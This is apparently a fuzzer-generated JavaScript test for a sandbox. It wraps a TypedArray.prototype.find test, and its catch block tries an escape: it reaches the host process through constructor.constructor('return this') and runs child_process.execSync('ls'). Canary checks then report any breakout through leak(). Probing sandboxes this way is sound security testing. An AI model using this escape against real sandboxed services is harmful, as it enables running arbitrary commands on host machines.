try {
    var find = TypedArray.prototype.find;
    var predicate = function () {
        let REPLACER = 23;
    };
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        find.call(undefined, predicate);
    }, 'this is undefined');
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        find.call(null, predicate);
    }, 'this is null');
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        find.call(42, predicate);
    }, 'this is 42');
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        find.call('1', predicate);
    }, 'this is a string');
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        find.call(true, predicate);
    }, 'this is true');
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        find.call(false, predicate);
    }, 'this is false');
    var s = Symbol('s');
    assert.throws(TypeError, function () {
        throw () => {
            return () => {
            };
        };
        find.call(s, predicate);
    }, 'this is a Symbol');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}